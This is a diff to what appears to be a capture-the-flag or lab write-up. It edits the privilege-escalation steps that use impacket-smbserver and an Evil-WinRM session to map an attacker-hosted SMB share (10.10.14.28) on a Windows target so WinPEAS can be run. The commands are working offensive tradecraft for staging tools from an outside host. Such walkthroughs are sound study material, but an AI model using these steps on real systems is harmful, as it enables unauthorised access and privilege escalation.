@@ -227,13 +227,15 @@ rpcclient $> querygroup 0x47c
 
 ## Privilege Escalation
 ### WinPEAS
-  - Setup drive to run `winPEASx64.exe`
+  - Setup share to run `winPEASx64.exe`
 ``` CSS
 ▶ impacket-smbserver pwnshare $(pwd) -smb2support -user random -password passwd
 ```
-
+  - Create Credential Object and Access Share as Drive
 ```CSS
 *Evil-WinRM* PS C:\> $pass = convertto-securestring 'passwd' -AsPlainText -Force
 *Evil-WinRM* PS C:\> $cred = New-Object System.Management.Automation.PSCredential('random', $pass)
 *Evil-WinRM* PS C:\> New-PSDrive -Name pwndrive -PSProvider FileSystem -Credential $cred -Root \\10.10.14.28\pwnshare
 ```
+![image](https://user-images.githubusercontent.com/83878909/231182636-fb2c4894-58e8-4da8-a09c-99161fd0b09c.png)
+
